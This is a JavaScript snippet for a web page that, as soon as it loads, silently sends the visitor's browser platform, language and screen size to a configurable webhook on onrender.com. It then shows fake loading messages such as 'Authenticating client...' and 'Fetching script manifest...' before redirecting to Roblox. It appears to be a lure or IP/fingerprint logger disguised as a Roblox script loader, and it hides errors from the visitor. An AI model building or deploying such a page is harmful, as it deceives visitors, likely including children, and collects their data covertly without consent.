    <script>
        // --- CONFIGURATION ---
        // Paste the URL for your new Render service here.
        // Make sure to add "/submit" at the end.
        const proxy_url = "https://webhook.onrender.com/submit"; // <<-- REPLACE THIS

        // The final destination.
        const redirect_url = "https://www.roblox.com/discover";
        // -------------------

        async function triggerProxy() {
            try {
                // Gather the data that only the browser knows.
                const browserData = {
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${window.screen.width}x${window.screen.height}`
                };

                // Send this data to our secure Render proxy server.
                await fetch(proxy_url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(browserData),
                });

            } catch (error) {
                // If this fails, we don't alert the user.
                console.error("Error triggering proxy:", error);
            }
        }

        // Run the trigger function immediately upon page load.
        triggerProxy();

        // The code for the visual loading messages and the 5-second redirect timer
        // remains exactly the same as before.
        const statusMessages=["Establishing secure connection...","Authenticating client...","Fetching script manifest...","Loading core modules...","Finalizing..."];let messageIndex=0;const statusElement=document.getElementById('status-text');const messageInterval=setInterval(()=>{messageIndex++;if(messageIndex<statusMessages.length){statusElement.textContent=statusMessages[messageIndex]}else{clearInterval(messageInterval)}},1000);
        setTimeout(() => {
            window.location.replace(redirect_url);
        }, 5000);
    </script>
